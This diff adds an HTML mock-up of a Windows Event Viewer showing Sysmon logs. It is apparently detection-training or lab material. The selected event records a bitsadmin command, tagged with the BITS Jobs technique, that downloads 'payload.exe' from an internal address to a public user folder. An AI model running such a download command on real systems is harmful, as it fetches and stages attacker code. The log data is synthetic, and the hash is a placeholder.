@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Event Viewer — Sysmon</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: "Segoe UI", sans-serif; background: #f0f0f0; font-size: 12px; color: #000; }
+  .titlebar { background: #fff; border-bottom: 1px solid #ccc; padding: 8px 12px; font-weight: 600; }
+  .menubar { background: #fafafa; border-bottom: 1px solid #ddd; padding: 4px 12px; font-size: 11px; color: #333; }
+  .layout { display: flex; height: calc(100vh - 56px); }
+  .tree { width: 280px; background: #fff; border-right: 1px solid #ccc; padding: 8px; font-size: 12px; }
+  .tree ul { list-style: none; padding-left: 16px; }
+  .tree .sel { background: #cce8ff; padding: 2px 4px; }
+  .detail { flex: 1; display: flex; flex-direction: column; background: #fff; }
+  .events { flex: 1; overflow: auto; }
+  table { width: 100%; border-collapse: collapse; }
+  th { background: #f5f5f5; text-align: left; padding: 6px 8px; border-bottom: 1px solid #ddd; position: sticky; top: 0; }
+  td { padding: 5px 8px; border-bottom: 1px solid #eee; }
+  tr.sel td { background: #e5f3ff; }
+  .bottom { height: 200px; border-top: 1px solid #ccc; padding: 10px; overflow: auto; font-family: Consolas, monospace; font-size: 11px; line-height: 1.6; background: #fafafa; }
+  .tag { color: #0066cc; }
+</style>
+</head>
+<body>
+<div class="titlebar">Event Viewer — WKSTN-042</div>
+<div class="menubar">Action · View · Help</div>
+<div class="layout">
+  <div class="tree">
+    <div>Event Viewer (Local)</div>
+    <ul>
+      <li>Applications and Services Logs
+        <ul>
+          <li class="sel">Microsoft-Windows-Sysmon/Operational</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+  <div class="detail">
+    <div class="events">
+      <table>
+        <thead><tr><th>Date and Time</th><th>Event ID</th><th>Task Category</th><th>Source</th></tr></thead>
+        <tbody>
+          <tr class="sel"><td>6/17/2026 2:22:15 PM</td><td>1</td><td>Process Create</td><td>Sysmon</td></tr>
+          <tr><td>6/17/2026 2:22:14 PM</td><td>1</td><td>Process Create</td><td>Sysmon</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="bottom">
+      <span class="tag">Event 1, Sysmon</span><br>
+      Process Create:<br>
+      RuleName: technique_id=T1197,technique_name=BITS Jobs<br>
+      UtcTime: 2026-06-17 14:22:15.332<br>
+      ProcessGuid: {8e2f4a1b-3c9d-4e01-a2b3-c4d5e6f70891}<br>
+      Image: C:\Windows\System32\bitsadmin.exe<br>
+      CommandLine: bitsadmin /transfer debjob /download /priority foreground http://10.10.30.10:8888/file/download C:\Users\Public\payload.exe<br>
+      CurrentDirectory: C:\Users\jsmith\<br>
+      User: CORP\jsmith<br>
+      ParentImage: C:\Windows\System32\cmd.exe<br>
+      IntegrityLevel: Medium<br>
+      Hashes: SHA256=A3F2B8C1D4E5F678901234567890ABCD1234567890ABCDEF1234567890ABCD12
+    </div>
+  </div>
+</div>
+</body>
+</html>
